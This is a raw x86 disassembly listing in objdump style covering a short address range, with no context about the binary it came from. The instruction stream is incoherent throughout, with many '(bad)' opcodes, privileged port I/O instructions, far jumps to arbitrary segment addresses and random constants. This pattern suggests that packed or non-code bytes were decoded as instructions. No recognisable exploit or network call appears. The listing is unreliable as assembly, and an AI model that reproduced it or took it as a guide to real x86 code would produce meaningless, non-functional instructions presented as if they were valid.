  41b6e7:	(bad)  
  41b6e8:	cmp    ah,BYTE PTR [edx+ebp*8-0x4f]
  41b6ec:	push   ds
  41b6ed:	es in  al,dx
  41b6ef:	leave  
  41b6f0:	int    0x8
  41b6f2:	in     eax,dx
  41b6f3:	push   0xffffffad
  41b6f5:	sbb    bh,bl
  41b6f7:	and    al,0x7d
  41b6f9:	mov    ds,WORD PTR [eax+eax*4-0x4b]
  41b6fd:	jg     0x41b773
  41b6ff:	and    BYTE PTR [ebx+0x4d],cl
  41b702:	push   esi
  41b703:	adc    ch,cl
  41b705:	je     0x41b6fc
  41b707:	dec    esp
  41b708:	ret    0x4391
  41b70b:	bound  eax,QWORD PTR [ebx-0x70]
  41b70e:	leave  
  41b70f:	mov    esi,0x4e0d0faf
  41b714:	pop    edi
  41b715:	test   BYTE PTR [ebx+0x4b],dh
  41b718:	in     al,0x1f
  41b71a:	mov    edi,0xd2404e5d
  41b71f:	sahf   
  41b720:	mov    edx,0x54b1286c
  41b725:	jmp    0x9f5a766b
  41b72a:	repz add ecx,edx
  41b72d:	ins    DWORD PTR es:[edi],dx
  41b72e:	add    BYTE PTR [ecx-0x2b74b34b],0xfc
  41b735:	mov    ds:0x5da72a37,eax
  41b73a:	mov    ch,0x85
  41b73c:	in     eax,dx
  41b73d:	adc    al,0x42
  41b73f:	or     al,0xa2
  41b741:	daa    
  41b742:	jge    0x41b71e
  41b744:	cmp    DWORD PTR [ecx-0x7cda2320],esp
  41b74a:	fistp  QWORD PTR [edx-0x4550925b]
  41b750:	das    
  41b751:	call   0x5834:0x2fe1803f
  41b758:	fsubr  st,st(3)
  41b75a:	ins    DWORD PTR es:[edi],dx
  41b75b:	and    al,0xad
  41b75d:	mov    esp,0x1e51d907
  41b762:	push   ds
  41b763:	or     BYTE PTR [ebp-0x5],ah
  41b766:	das    
  41b767:	inc    edi
  41b768:	hlt    
  41b769:	call   0xf724:0x525472a5
  41b770:	in     eax,0x13
  41b772:	sar    DWORD PTR [edi],1
  41b774:	popf   
  41b775:	pop    ebp
  41b776:	inc    ebx
  41b777:	dec    ecx
  41b778:	dec    eax
  41b779:	xchg   ecx,eax
  41b77a:	mov    bh,0xe
  41b77c:	sbb    eax,DWORD PTR ds:0xf521a0fe
  41b782:	mov    ah,0x5e
  41b784:	dec    esi
  41b785:	mov    cl,BYTE PTR [esp+esi*2]
  41b788:	ret    0xd02e
  41b78b:	or     ebp,esp
  41b78d:	popa   
  41b78e:	scas   al,BYTE PTR es:[edi]
  41b78f:	sub    al,al
  41b791:	pushf  
  41b792:	aas    
  41b793:	lock xchg esp,eax
  41b795:	iret   
  41b796:	inc    esi
  41b797:	dec    ebx
  41b798:	jp     0x41b78d
  41b79a:	add    eax,0xa17cf041
  41b79f:	mov    ah,0x9a
  41b7a1:	push   edx
  41b7a2:	xchg   BYTE PTR [esi+0x20],al
  41b7a5:	push   esi
  41b7a6:	das    
  41b7a7:	inc    eax
  41b7a8:	iret   
  41b7a9:	int3   
  41b7aa:	xchg   bh,dl
  41b7ac:	cdq    
  41b7ad:	dec    ebp
  41b7ae:	push   ebp
  41b7af:	cmc    
  41b7b0:	adc    eax,DWORD PTR [esi]
  41b7b2:	mov    cl,0x60
  41b7b4:	out    dx,eax
  41b7b5:	and    edx,edx
  41b7b7:	push   edx
  41b7b8:	in     al,0xe0
  41b7ba:	imul   esp,DWORD PTR [esi-0x61],0xafe72993
  41b7c1:	jb     0x41b781
  41b7c3:	aad    0xcf
  41b7c5:	pop    ecx
  41b7c6:	popf   
  41b7c7:	clc    
  41b7c8:	dec    edx
  41b7c9:	retf   
  41b7ca:	in     eax,dx
  41b7cb:	in     al,0x73
  41b7cd:	loop   0x41b78d
  41b7cf:	xor    eax,0x87de1dd3
  41b7d4:	and    al,0x36
  41b7d6:	xchg   ecx,eax
  41b7d7:	xchg   DWORD PTR [edx],esi
  41b7d9:	xchg   edx,eax
  41b7da:	dec    ebp
  41b7db:	popf   
  41b7dc:	inc    eax
  41b7dd:	(bad)  
  41b7de:	int3   
  41b7df:	pop    ss
  41b7e0:	or     dh,ah
  41b7e2:	out    dx,al
  41b7e3:	inc    esp
  41b7e4:	mov    ah,0x1c
  41b7e6:	mov    ebx,0x49c5b075
  41b7eb:	(bad)  
  41b7ec:	ret    
  41b7ed:	int3   
  41b7ee:	push   ebp
  41b7ef:	xlat   BYTE PTR ds:[ebx]
  41b7f0:	bswap  ebp
  41b7f2:	or     esi,DWORD PTR [edi-0x5f]
  41b7f5:	test   eax,0xeb045d7b
  41b7fa:	pop    ds
  41b7fb:	mov    ebp,0x5ef2e363
  41b800:	scas   eax,DWORD PTR es:[edi]
  41b801:	push   esp
  41b802:	xchg   ecx,eax
  41b803:	fwait
  41b804:	xchg   BYTE PTR [eax+0x71be9c01],ch
  41b80a:	add    DWORD PTR [ecx+0x5617c75a],edx
  41b810:	scas   al,BYTE PTR es:[edi]
  41b811:	pop    es
  41b812:	ds inc esi
  41b814:	ja     0x41b7c9
  41b816:	mov    gs,WORD PTR [edi]
  41b818:	sub    ecx,esp
  41b81a:	(bad)
  41b81f:	sbb    esp,esi
  41b821:	push   0x51
  41b823:	pop    ebx
  41b824:	mov    dh,0x4b
  41b826:	cmc    
  41b827:	xor    DWORD PTR ds:0xb827b78e,edx
  41b82d:	(bad)  
  41b82e:	into   
  41b82f:	scas   al,BYTE PTR es:[edi]
  41b830:	je     0x41b7dd
  41b832:	jo     0x41b859
  41b834:	push   edx
  41b835:	outs   dx,BYTE PTR ds:[esi]
  41b836:	test   bl,dh
  41b838:	xchg   ebx,eax
  41b83a:	stos   BYTE PTR es:[edi],al
  41b83b:	mov    ds:0xc54e8c9a,eax
  41b840:	and    al,0x8f
  41b842:	ins    BYTE PTR es:[edi],dx
  41b843:	add    DWORD PTR [esi+0x68],ebp
  41b846:	jg     0x41b8c2
  41b848:	ss ins BYTE PTR es:[edi],dx
  41b84a:	ret    
  41b84b:	adc    ah,ch
  41b84d:	jge    0x41b88c
  41b84f:	jl     0x41b8c4
  41b851:	fisttp DWORD PTR [edx+0x48]
  41b854:	mov    ebx,0x54ebe69d
  41b859:	mov    ebx,0x7c96ff8a
  41b85e:	dec    ebx
  41b85f:	push   ecx
  41b860:	and    al,0x2b
  41b862:	jo     0x41b8ab
  41b864:	aad    0x89
  41b866:	in     eax,dx
  41b867:	xchg   esi,eax
  41b868:	xchg   ecx,eax
  41b869:	gs (bad) 
  41b86b:	cmp    BYTE PTR [esi-0x5c],bh
  41b86e:	and    dl,BYTE PTR cs:[ecx+edx*2+0x37d9da59]
  41b876:	jle    0x41b8a3
  41b878:	ins    DWORD PTR es:[edi],dx
  41b879:	shl    BYTE PTR [edx+0x3f],0x77
  41b87d:	rcr    DWORD PTR [ebx-0x6bb5d02a],0x6b
  41b884:	cmp    al,0x22
  41b886:	jno    0x41b8b3
  41b888:	xchg   ecx,eax
  41b889:	(bad)  
  41b88a:	outs   dx,BYTE PTR ds:[esi]
  41b88b:	fldcw  WORD PTR [ebx-0x3]
  41b88e:	mov    esp,0x46bbcaa3
  41b893:	sti    
  41b894:	adc    al,0x7c
  41b896:	(bad)  
  41b897:	data16 shr BYTE PTR [eax-0x2c],1
  41b89b:	xchg   esi,eax
  41b89c:	leave  
  41b89d:	fbstp  TBYTE PTR [ebx+0x6df0129f]
  41b8a3:	shr    BYTE PTR [eax],0x24
  41b8a6:	fwait
  41b8a7:	pop    ecx
  41b8a8:	add    eax,0x5b804980
  41b8ad:	pop    edx
  41b8ae:	retf   0xf25e
  41b8b1:	or     al,0xc3
  41b8b3:	js     0x41b902
  41b8b5:	adc    BYTE PTR [edi],0xec
  41b8b8:	push   cs
  41b8b9:	push   ebx
  41b8ba:	rcr    bh,0x5d
  41b8bd:	xor    eax,0xb877a8b2
  41b8c2:	push   ss
  41b8c3:	add    dh,BYTE PTR [ebx+0x4a]
  41b8c6:	xchg   BYTE PTR [edx],cl
  41b8c8:	mov    eax,0x61048973
  41b8cd:	mov    al,ds:0xcb210d60
  41b8d2:	jne    0x41b90d
  41b8d4:	leave  
  41b8d5:	jmp    0x17187038
  41b8da:	xchg   edi,eax
  41b8db:	mov    edi,0xc99df5e
  41b8e0:	inc    eax
  41b8e1:	xor    BYTE PTR [ebx-0x39ff5add],bl
  41b8e7:	mov    ds:0x9f77998e,eax
  41b8ec:	pop    esi
  41b8ed:	scas   eax,DWORD PTR es:[edi]
  41b8ee:	mov    BYTE PTR [eax],bl
  41b8f0:	cmp    BYTE PTR [ebp-0x5b2de6de],0xea
  41b8f7:	or     DWORD PTR [ecx],0x3a
  41b8fa:	out    0x85,al
  41b8fc:	mov    ebx,0x1bbdf025
  41b901:	les    ecx,FWORD PTR [eax]
  41b903:	or     ebp,esi
  41b905:	jae    0x41b8ef
  41b907:	pop    eax
  41b908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b909:	dec    ecx
  41b90a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b90b:	shr    BYTE PTR [edx],0xd6
  41b90e:	dec    esi
  41b90f:	or     eax,0x74e4b80c
  41b914:	retf   0xde04
  41b917:	in     eax,0xb3
  41b919:	sbb    ebx,esp
  41b91b:	in     eax,dx
  41b91c:	popa   
  41b91d:	sbb    eax,0x212da8a7
  41b922:	enter  0x84d3,0xdc
  41b926:	add    DWORD PTR [ecx],edx
  41b928:	fist   WORD PTR [ebx+0x2a6e9704]
  41b92e:	xor    eax,0xc7178d83
  41b933:	cdq    
  41b934:	sbb    DWORD PTR [edx],ebp
  41b936:	sbb    edi,edi
  41b938:	sbb    eax,0x5775bbc7
  41b93d:	fbstp  TBYTE PTR [ebx+0x30]
  41b940:	inc    ebx
  41b941:	in     al,dx
  41b942:	push   edx
  41b943:	and    BYTE PTR ds:0x880a338e,dl
  41b949:	push   0x16b5b9cd
  41b94e:	or     al,0x6b
  41b950:	(bad)  [esi+esi*2+0x26]
  41b954:	and    BYTE PTR [edi],0xbc
  41b957:	mov    ds:0xa05b3c9,eax
  41b95c:	dec    edi
  41b95d:	fisttp QWORD PTR [esi]
  41b95f:	jne    0x41b9c8
  41b961:	mov    ch,bl
  41b963:	xor    esp,DWORD PTR [ebp+0x4914fa12]
  41b969:	loopne 0x41b9ca
  41b96b:	loopne 0x41b9b9
  41b96d:	pop    edx
  41b96e:	out    0xfe,al
  41b970:	dec    edi
  41b971:	call   0x65649ff1
  41b976:	jecxz  0x41b9a3
  41b978:	pop    ds
  41b979:	adc    esi,ebp
  41b97b:	cmp    BYTE PTR [edx],ch
  41b97d:	push   ss
  41b97e:	mov    ecx,0x14450a22
  41b983:	pop    ebx
  41b984:	out    0x74,al
  41b986:	fcomp  DWORD PTR [esi+0x2e]
  41b989:	mov    ch,0x9
  41b98b:	in     eax,0xc7
  41b98d:	pop    es
  41b98e:	enter  0x225b,0x42
  41b992:	pushf  
  41b993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b994:	mov    dl,0xbb
  41b996:	(bad)  
  41b997:	xor    edi,DWORD PTR [ecx-0x11]
  41b99a:	ffreep st(2)
  41b99c:	pusha  
  41b99d:	mov    edx,0x8d304ba1
  41b9a2:	xchg   edi,eax
  41b9a3:	pop    eax
  41b9a4:	stos   DWORD PTR es:[edi],eax
  41b9a5:	jne    0x41ba10
  41b9a7:	scas   eax,DWORD PTR es:[edi]
  41b9a8:	aad    0x86
  41b9aa:	in     al,dx
  41b9ab:	mov    ds:0xeb0fe404,eax
  41b9b0:	test   DWORD PTR ds:0x6db9b0f6,0x2aedee66
  41b9ba:	imul   edi,DWORD PTR [ebx+0x13],0x7a810152
  41b9c1:	pop    ss
  41b9c2:	arpl   WORD PTR [eax+0x1b68e4d0],bp
  41b9c8:	adc    BYTE PTR ds:0x83b979e2,bh
  41b9ce:	xchg   DWORD PTR [eiz*8+0x56537278],edi
  41b9d5:	push   es
  41b9d6:	jecxz  0x41ba1c
  41b9d8:	xchg   ebx,eax
  41b9d9:	ret    
  41b9da:	in     eax,0xa6
  41b9dc:	push   ebx
  41b9dd:	or     edx,ebp
  41b9df:	dec    ebp
  41b9e0:	sbb    al,0x91
  41b9e2:	jmp    0x2094:0x2d7e0f40
  41b9e9:	mov    ecx,0x71fea550
  41b9ee:	jne    0x41ba1d
  41b9f0:	gs ds (bad) 
  41b9f3:	stos   BYTE PTR es:[edi],al
  41b9f4:	add    BYTE PTR [edi],dh
  41b9f6:	mov    al,0xc8
  41b9f8:	mul    esi
  41b9fa:	push   es
  41b9fb:	cmp    esp,edx
  41b9fd:	(bad)  
  41b9fe:	stos   DWORD PTR es:[edi],eax
  41b9ff:	inc    ebp
  41ba00:	jnp    0x41ba61
  41ba02:	popf   
  41ba03:	icebp  
  41ba04:	or     BYTE PTR [ecx+0x4],ah
  41ba07:	mov    eax,eax
  41ba09:	mov    ds:0xaa7fd542,eax
  41ba0e:	dec    ecx
  41ba0f:	nop
  41ba10:	sahf   
  41ba11:	sub    BYTE PTR [ebp+0x3b],bl
  41ba14:	xcrypt-ctr (bad)
  41ba15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba16:	fmul   QWORD PTR [esi-0x31b6f3b2]
  41ba1c:	into   
  41ba1d:	enter  0xb1de,0x5
  41ba21:	xor    ch,BYTE PTR [esi-0x798d1bb3]
  41ba27:	push   esp
  41ba28:	loope  0x41ba50
  41ba2a:	loop   0x41ba82
  41ba2c:	push   edi
  41ba2d:	pop    es
  41ba2e:	mov    ecx,0xdd75a775
  41ba33:	lods   al,BYTE PTR ds:[esi]
  41ba34:	pop    ss
  41ba35:	les    edi,FWORD PTR [ebp+0x1d207aaf]
  41ba3b:	jb     0x41ba78
  41ba3d:	scas   al,BYTE PTR es:[edi]
  41ba3e:	repnz cmp eax,0x80d5816b
  41ba44:	sbb    ebx,ebx
  41ba46:	adc    BYTE PTR [ebp+ebx*4+0x255aa1ac],ch
  41ba4d:	stos   BYTE PTR es:[edi],al
  41ba4e:	and    bh,BYTE PTR ds:[esi+0x39]
  41ba52:	cwde   
  41ba53:	push   ebp
  41ba54:	xor    esp,DWORD PTR [eax+0x1a]
  41ba57:	pusha  
  41ba58:	mov    al,ds:0x19e4cb22
  41ba5d:	pop    edi
  41ba5e:	jmp    0x6c42:0x920a7c68
  41ba65:	out    dx,eax
  41ba66:	or     ecx,ecx
  41ba68:	ret    0xd441
  41ba6b:	aaa    
  41ba6c:	stos   DWORD PTR es:[edi],eax
  41ba6d:	(bad)  
  41ba6e:	in     al,dx
  41ba6f:	bound  ebp,QWORD PTR [edx]
  41ba71:	ret    
  41ba72:	push   esp
  41ba73:	mov    al,0x36
  41ba75:	or     DWORD PTR [eax+0x72],esi
  41ba78:	icebp  
  41ba79:	dec    eax
  41ba7a:	pop    ss
  41ba7b:	mov    ah,0x8
  41ba7d:	int    0x53
  41ba7f:	mov    bl,0xc6
  41ba81:	out    0x86,eax
  41ba83:	inc    ecx
  41ba84:	nop
  41ba85:	(bad)  
  41ba86:	outs   dx,BYTE PTR ds:[esi]
  41ba87:	test   esi,edx
  41ba89:	push   ds
  41ba8a:	rcr    ch,1
  41ba8c:	sbb    bh,dl
  41ba8e:	cmp    BYTE PTR [esi+0x5d],0x6
  41ba92:	das    
  41ba93:	sub    ecx,DWORD PTR [ecx-0x2acc4fa2]
  41ba99:	sahf   
  41ba9a:	pusha  
  41ba9b:	mov    bl,0x25
  41ba9d:	and    BYTE PTR [ebp-0x22],ch
  41baa0:	dec    edi
  41baa1:	arpl   WORD PTR [eax-0x54ee14a1],bp
  41baa7:	idiv   DWORD PTR [edi+eax*8]
  41baaa:	and    DWORD PTR [ebp+0x10],esp
  41baad:	loop   0x41baa3
  41baaf:	or     esp,ebp
  41bab1:	pushf  
  41bab2:	pop    ds
  41bab3:	dec    edx
  41bab4:	not    DWORD PTR [ebp+0x128b0b0f]
  41baba:	pop    ecx
  41babb:	shl    BYTE PTR [edx-0x3],1
  41babe:	sub    al,0x5e
  41bac0:	push   ss
  41bac1:	leave  
  41bac2:	add    eax,0xed6472fa
  41bac7:	jnp    0x41ba92
  41bac9:	(bad)  
  41baca:	ins    BYTE PTR es:[edi],dx
  41bacb:	stos   DWORD PTR es:[edi],eax
  41bacc:	retf   
  41bacd:	sub    ah,BYTE PTR [edx+esi*4-0x72b5bfc7]
  41bad4:	clc    
  41bad5:	mov    BYTE PTR [esp+eiz*8-0x3e807f53],dh
  41badc:	mov    al,ds:0xc7019d31
  41bae1:	cmc    
  41bae2:	ins    BYTE PTR es:[edi],dx
  41bae3:	cld    
  41bae4:	fild   QWORD PTR [edi]
  41bae6:	pop    ecx
  41bae7:	daa    
  41bae8:	loope  0x41bb2d
  41baea:	outs   dx,DWORD PTR ds:[esi]
  41baeb:	dec    esp
  41baec:	gs mov ecx,esp
  41baef:	or     esp,DWORD PTR gs:[ebx+eax*4+0x1e04ce69]
  41baf7:	cmp    edi,esp
  41baf9:	or     BYTE PTR [edx-0x25],cl
  41bafc:	xchg   BYTE PTR [ecx+0x6f7fdea7],dl
  41bb02:	push   edx
  41bb03:	arpl   WORD PTR [ebp-0x20b9947a],sp
  41bb09:	mov    ecx,DWORD PTR [ebx+0x3a]
  41bb0c:	das    
  41bb0d:	mov    dh,0x17
  41bb0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb10:	(bad)  
  41bb11:	pop    ebp
  41bb12:	aad    0x46
  41bb14:	sbb    eax,0x8ecc76bb
  41bb19:	popa   
  41bb1a:	push   es
  41bb1b:	cmp    edx,DWORD PTR [esp+eiz*8]
  41bb1e:	ss out dx,al
  41bb20:	xor    ebp,ebx
  41bb22:	inc    ecx
  41bb23:	ins    BYTE PTR es:[edi],dx
  41bb24:	or     bh,ah
  41bb26:	cli    
  41bb27:	inc    ebx
  41bb28:	push   edx
  41bb29:	sub    DWORD PTR [ebp+0x66],eax
  41bb2c:	or     al,0xa1
  41bb2e:	clc    
  41bb2f:	inc    esi
  41bb30:	jmp    0x7177:0x3aec8bdd
  41bb37:	adc    eax,0xba617c6e
  41bb3c:	xchg   ebp,eax
  41bb3d:	sub    eax,0xaededc67
  41bb42:	push   0x7
  41bb44:	addr16 push eax
  41bb46:	adc    edx,DWORD PTR [eax-0xc7fd692]
  41bb4c:	add    al,0xe5
  41bb4e:	bound  esp,QWORD PTR [edx-0x9]
  41bb51:	(bad)  
  41bb52:	fnsave [edi]
  41bb54:	jg     0x41bb17
  41bb56:	(bad)  [eax]
  41bb58:	and    al,0xcd
  41bb5a:	aad    0x4e
  41bb5c:	xor    edi,DWORD PTR [edx]
  41bb5e:	je     0x41bae5
  41bb60:	imul   esp,edi,0xffffff9c
  41bb63:	adc    ah,BYTE PTR [eax-0x38a27149]
  41bb69:	jb     0x41bb77
  41bb6b:	ret    
  41bb6c:	in     al,dx
  41bb6d:	mov    BYTE PTR [eax],ah
  41bb6f:	aad    0x53
  41bb71:	lods   al,BYTE PTR ds:[esi]
  41bb72:	fisttp DWORD PTR [edx+0x51]
  41bb75:	in     al,dx
  41bb76:	sub    esi,DWORD PTR [ecx-0x7]
  41bb79:	aam    0xdb
  41bb7b:	call   0x9fe97bc0
  41bb80:	cmp    BYTE PTR [ebp+esi*4-0x4e],al
  41bb84:	xchg   ebp,eax
  41bb85:	adc    ebp,DWORD PTR [edx]
  41bb87:	ss mov edi,cs
  41bb8a:	xchg   edi,eax
  41bb8b:	and    esp,DWORD PTR [eax+0x5ce09e4f]
  41bb91:	mov    bh,0x43
  41bb93:	retf   
  41bb94:	push   ebp
  41bb95:	ja     0x41bb95
  41bb97:	jmp    0x41bb9f
  41bb99:	(bad)  [ebx-0x70]
  41bb9c:	ds dec ecx
  41bb9e:	inc    edx
  41bb9f:	sub    DWORD PTR [esi],esp
  41bba1:	daa    
  41bba2:	jmp    0x4085:0xabeffb4f
  41bba9:	pop    ecx
  41bbaa:	dec    edi
  41bbab:	jge    0x41bb75
  41bbad:	xchg   esi,eax
  41bbae:	cmp    DWORD PTR [edx+0x23],ebp
  41bbb1:	xchg   ebx,eax
  41bbb2:	push   ecx
  41bbb3:	aaa    
  41bbb4:	fwait
  41bbb5:	pop    ebp
  41bbb6:	repnz (bad) 
  41bbb8:	dec    edx
  41bbb9:	push   esp
  41bbba:	sub    al,0x1b
  41bbbc:	cdq    
  41bbbd:	jo     0x41bb85
  41bbbf:	cmp    ch,BYTE PTR [ebp-0x32cf75a]
  41bbc5:	not    DWORD PTR ds:0x8d10cbb9
  41bbcb:	inc    ebx
  41bbcc:	loope  0x41bc45
  41bbce:	mov    dh,0xd4
  41bbd0:	stc    
  41bbd1:	mov    ebp,0x4202104a
  41bbd6:	ins    BYTE PTR es:[edi],dx
  41bbd7:	mov    ah,0xa3
  41bbd9:	sub    ecx,ebp
  41bbdb:	push   eax
  41bbdc:	pop    ebp
  41bbdd:	xchg   esp,eax
  41bbde:	dec    edi
  41bbdf:	in     eax,dx
  41bbe0:	xor    BYTE PTR [edi+ebp*1],dh
  41bbe3:	sar    DWORD PTR [ebx+0x53],cl
  41bbe6:	test   DWORD PTR [ebp+0x66],edi
  41bbe9:	jl     0x41bc21
  41bbeb:	cdq    
  41bbec:	sbb    DWORD PTR [eax-0x68],0x8d493935
  41bbf3:	sahf   
  41bbf4:	inc    edi
  41bbf5:	popf   
  41bbf6:	jge    0x41bc64
  41bbf8:	push   ecx
  41bbf9:	ror    DWORD PTR [ecx+0x31e18130],cl
  41bbff:	in     eax,0xa5
  41bc01:	mov    ah,BYTE PTR [edx*2+0x65d2f94c]
  41bc08:	cwde   
  41bc09:	mov    cs,eax
  41bc0b:	mov    ds:0x222904e2,eax
  41bc10:	ins    DWORD PTR es:[edi],dx
  41bc11:	mov    al,BYTE PTR [edi-0x38]
  41bc14:	cmp    esi,DWORD PTR [ebp+0x44986fa9]
  41bc1a:	(bad)  
  41bc1b:	sbb    DWORD PTR [edx-0x7f],esp
  41bc1e:	call   0xe66f04f3
  41bc23:	push   0xffffffb0
  41bc25:	pop    ds
  41bc26:	fmul   st(6),st
  41bc28:	fs mov ebx,0xc0d9436b
  41bc2e:	mov    esi,0x65ae2165
  41bc33:	mov    WORD PTR [esi+esi*2-0x28],es
  41bc37:	scas   al,BYTE PTR es:[edi]
  41bc38:	in     eax,0xb0
  41bc3a:	iret   
  41bc3b:	mov    ds:0x18b1283f,eax
  41bc40:	pop    ss
  41bc41:	ret    0x61dd
  41bc44:	std    
  41bc45:	mov    cl,0x80
  41bc47:	xlat   BYTE PTR ds:[ebx]
  41bc48:	and    bl,BYTE PTR [ecx-0x6c36f9bf]
  41bc4e:	or     DWORD PTR ds:0xda5120e,edi
  41bc54:	dec    ebx
  41bc55:	out    dx,eax
  41bc56:	outs   dx,DWORD PTR ds:[esi]
  41bc57:	in     eax,0xf4
  41bc59:	inc    edx
  41bc5a:	(bad)  
  41bc5b:	jns    0x41bbfb
  41bc5d:	push   ecx
  41bc5e:	mov    edx,0x80e9bb3d
  41bc63:	cmp    cl,BYTE PTR [eax-0x4a7ecdf8]
  41bc69:	dec    ebx
  41bc6a:	mov    DWORD PTR [ecx],edx
  41bc6c:	in     eax,dx
  41bc6d:	xchg   ebx,eax
  41bc6e:	lea    eax,[edx]
  41bc70:	inc    ebp
  41bc71:	cmp    BYTE PTR ds:0xbb6ffeba,bl
  41bc77:	int    0x69
  41bc79:	pop    ds
  41bc7a:	xlat   BYTE PTR ds:[ebx]
  41bc7b:	push   ebx
  41bc7c:	lahf   
  41bc7d:	cdq    
  41bc7e:	loope  0x41bc5b
  41bc80:	cmp    eax,0x623daa7a
  41bc85:	or     BYTE PTR ds:0x522b27dd,0xe1
  41bc8c:	mov    al,0x50
  41bc8e:	dec    esi
  41bc8f:	adc    eax,0x5c4f59f4
  41bc94:	retf   
  41bc95:	bound  ebx,QWORD PTR [ebx]
  41bc97:	cmp    cl,BYTE PTR [ebx+eax*8-0x49]
  41bc9b:	in     al,dx
  41bc9c:	mov    bl,BYTE PTR [edi-0x75510e94]
  41bca2:	add    dl,0x54
  41bca5:	aaa    
  41bca6:	out    0x4,eax
  41bca8:	mov    DWORD PTR [edi-0x2a6958cd],ecx
  41bcae:	pop    ebp
  41bcaf:	push   ebx
  41bcb0:	mov    edx,0x81cf6a67
  41bcb5:	cld    
  41bcb6:	stos   BYTE PTR es:[edi],al
  41bcb7:	sub    al,0x35
  41bcb9:	pop    esi
  41bcba:	push   edi
  41bcbb:	sub    BYTE PTR [edx],dl
  41bcbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcbf:	sar    BYTE PTR [ecx],0x79
  41bcc2:	fisubr WORD PTR [ecx]
  41bcc4:	push   0x45486ed
  41bcc9:	test   al,0xe5
  41bccb:	push   0x22
  41bccd:	pop    es
  41bcce:	xchg   DWORD PTR [ecx-0x5a084384],eax
  41bcd4:	pop    esi
  41bcd5:	call   0x77247a29
  41bcda:	cmp    al,0x34
  41bcdc:	adc    BYTE PTR [ecx+0x35],bl
  41bcdf:	mov    bl,0xa2
  41bce1:	or     eax,0x1428a0b3
  41bce6:	ss popf 
  41bce8:	add    BYTE PTR ds:0xbf8e240d,bl
  41bcee:	in     al,0x41
  41bcf0:	push   es
  41bcf1:	inc    ebp
  41bcf2:	ret    0xb6c5
  41bcf5:	push   0xfffffff7
  41bcf7:	sub    edi,DWORD PTR [edi+0x72]
  41bcfa:	cmp    cl,BYTE PTR [edx]
  41bcfc:	cmp    eax,0xbc63d7f9
  41bd01:	push   es
  41bd02:	arpl   WORD PTR [ecx],sp
  41bd04:	and    al,0xf
  41bd06:	inc    esp
  41bd07:	mov    BYTE PTR [esi+edi*4+0x19],dl
  41bd0b:	and    bh,BYTE PTR [eax+0xb]
  41bd0e:	jle    0x41bca1
  41bd10:	daa    
  41bd11:	retfw  
  41bd13:	je     0x41bd30
  41bd15:	dec    edi
  41bd16:	mov    al,ds:0x9b352a70
  41bd1b:	xor    eax,0x37125323
  41bd20:	jne    0x41bd61
  41bd22:	fs mov eax,0x2fd3597d
  41bd28:	repz xchg ecx,eax
  41bd2a:	adc    bh,BYTE PTR [ebx-0x3d]
  41bd2d:	les    esi,FWORD PTR [edi+0x56]
  41bd30:	lods   eax,DWORD PTR ds:[esi]
  41bd31:	mov    edi,0x3a0cc48a
  41bd36:	inc    ebx
  41bd37:	shl    bl,1
  41bd39:	in     eax,dx
  41bd3a:	(bad)  
  41bd3b:	mov    al,0x9
  41bd3d:	pop    eax
  41bd3e:	mov    cl,0xd3
  41bd40:	test   eax,0x29946311
  41bd45:	lea    esi,[esi-0x62]
  41bd48:	fisttp WORD PTR [eax]
  41bd4a:	loope  0x41bd09
  41bd4c:	enter  0xdf85,0x17
  41bd50:	fild   QWORD PTR [ebx]
  41bd52:	mov    DWORD PTR [edi-0x481042be],ebx
  41bd58:	addr16 push cs
  41bd5a:	not    DWORD PTR [esi]
  41bd5c:	call   0x71e7:0x829c40ea
  41bd63:	jae    0x41bdad
  41bd65:	ins    BYTE PTR es:[edi],dx
  41bd66:	pop    ebx
  41bd67:	arpl   WORD PTR [ebx],sp
  41bd69:	dec    ebp
  41bd6a:	stos   BYTE PTR es:[edi],al
  41bd6b:	jne    0x41bdd8
  41bd6d:	xchg   edx,eax
  41bd6e:	xor    al,0x1e
  41bd70:	dec    ebp
  41bd71:	sub    al,0x19
  41bd73:	or     al,0xa8
  41bd75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd76:	outs   dx,BYTE PTR ds:[esi]
  41bd77:	popf   
  41bd78:	not    esi
  41bd7a:	mov    BYTE PTR [eax],bl
  41bd7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd7d:	stos   DWORD PTR es:[edi],eax
  41bd7e:	imul   edx,DWORD PTR [ecx],0x3f
  41bd81:	retf   0x1136
  41bd84:	jecxz  0x41bdd2
  41bd86:	out    0x55,eax
  41bd88:	dec    edx
  41bd89:	push   ecx
  41bd8a:	jge    0x41bd60
  41bd8c:	(bad)
  41bd90:	scas   eax,DWORD PTR es:[edi]
  41bd91:	mov    bl,0x1d
  41bd93:	add    eax,0xd1edac2
  41bd98:	in     al,0xce
  41bd9a:	or     edi,DWORD PTR [ebx-0xa]
  41bd9d:	inc    ebx
  41bd9e:	dec    eax
  41bd9f:	test   al,0x55
  41bda1:	loopne 0x41bdb2
  41bda3:	push   ss
  41bda4:	mov    ds:0xc4ec3f5,al
  41bda9:	sub    al,0xab
  41bdab:	imul   ebp,eax,0x53f87760
  41bdb1:	lods   eax,DWORD PTR ds:[esi]
  41bdb2:	jo     0x41bd4b
  41bdb4:	ins    BYTE PTR es:[edi],dx
  41bdb5:	jmp    0x41bd76
  41bdb7:	or     eax,0x42632dae
  41bdbc:	inc    ecx
  41bdbd:	fdivr  st(4),st
  41bdbf:	cmp    DWORD PTR [eax*2+0x2fc36c43],ebx
  41bdc6:	mul    eax
  41bdc8:	sbb    al,0x15
  41bdca:	jns    0x41bdad
  41bdcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdcd:	push   ds
  41bdce:	jecxz  0x41bd61
  41bdd0:	int3   
  41bdd1:	mov    esp,0x4b686859
  41bdd6:	push   ebx
  41bdd7:	sbb    BYTE PTR [ebx],bh
  41bdd9:	or     eax,0x586b1800
  41bdde:	out    dx,eax
  41bddf:	add    BYTE PTR [eax-0x78],0x50
  41bde3:	ds cmp ebx,0x18
  41bde7:	ins    BYTE PTR es:[edi],dx
  41bde8:	dec    ebp
  41bde9:	jle    0x41be11
  41bdeb:	out    0xb8,eax
  41bded:	or     al,0xbf
  41bdef:	aaa    
  41bdf0:	div    DWORD PTR [ebx-0x73]
